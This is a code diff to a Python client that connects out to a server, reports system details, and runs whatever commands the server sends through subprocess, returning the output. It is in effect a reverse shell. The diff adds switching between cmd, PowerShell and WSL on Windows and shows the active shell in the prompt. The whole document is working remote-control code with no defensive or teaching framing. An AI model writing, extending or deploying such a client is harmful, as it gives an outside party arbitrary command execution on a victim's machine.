@@ -34,6 +34,10 @@ class SystemInfo:
         self.iswindows = (os_info == "windows")  # Check if the OS is Windows
         self.powershell_available = False  # Flag to check if PowerShell is available
         self.wsl_available = False
+
+        #select the shell where to execute the commands
+        self.shell = "cmd"        
+
             
     def __str__(self):
         if self.iswindows:
@@ -118,6 +122,14 @@ def main():
         # Send system details to the server
         client_socket.send(system_details.encode())
 
+        # Send special commands allowed by the client
+        if systemInfo.iswindows:
+            client_socket.send(b"Working on windows shell")
+            client_socket.send(b"You can use other shells like PowerShell and WSL if available. Use the following to switch:\n")
+            client_socket.send(b"!usecmd\n")  # Send cmd command to the server
+            client_socket.send(b"!usepowershell\n")  # Send PowerShell command to the server
+            client_socket.send(b"!usewsl\n")  # Send WSL command to the server
+
 
     except Exception as e:
         print(f"Connection Failed: {e}")
@@ -132,7 +144,32 @@ def main():
             print("Decoding command...")
             command=data.decode("utf-8", errors="ignore")  # Decode the command received from the server
             print(f"Command received: {command}")
-            if command.startswith("cd "):
+            
+            if command.lower() == "!usecmd":
+                # Use cmd command
+                print("Requested cmd...")
+                systemInfo.shell = "cmd"
+                output = "cmd shell activated."
+            elif command.lower() == "!usepowershell":
+                # Use PowerShell command
+                print("Requested PowerShell...")
+                if systemInfo.powershell_available:
+                    # switch to PowerShell
+                    output = "PowerShell shell activated."
+                    systemInfo.shell = "powershell"  # Set the shell to PowerShell
+                else:
+                    output = "PowerShell is not available on this system."
+            elif command.lower() == "!usewsl":
+                # Use WSL command
+                print("Requested WSL...")
+                if systemInfo.wsl_available:
+                    # switch to WSL
+                    systemInfo.shell = "wsl"  # Set the shell to WSL
+                    output = "WSL shell activated."
+                else:
+                    output = "WSL is not available on this system."    
+
+            elif command.startswith("cd "):
                 # Change directory command
                 try:
                     os.chdir(command.strip("cd "))  # Change the current working directory
@@ -142,6 +179,17 @@ def main():
             else:
                 #Run the command with subprocessor
                 print("Executing command...")
+
+                # execute the command in the selected shell
+                if systemInfo.shell == "cmd":
+                    command = f"{command}"
+                elif systemInfo.shell == "powershell":
+                    command = f"powershell -Command {command}"
+                elif systemInfo.shell == "wsl":
+                    command = f"wsl {command}"
+                else:
+                    command = f"cmd /c {command}"
+
                 # Execute the command and capture the output
                 process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout, stderr = process.communicate()  # Communicate with the process
@@ -154,7 +202,7 @@ def main():
 
             #Append the currend working directory to the output
             current_directory = os.getcwd()  # Get the current working directory
-            final_output = f"{output} {current_directory} > "  # Append the current directory to the output
+            final_output = f"{output}\n[{systemInfo.shell}] {current_directory} > "  # Append the current directory to the output
             print(f"Final output: {final_output}")
             client_socket.send(final_output.encode())  # Send the output back to the server
         except Exception as e:
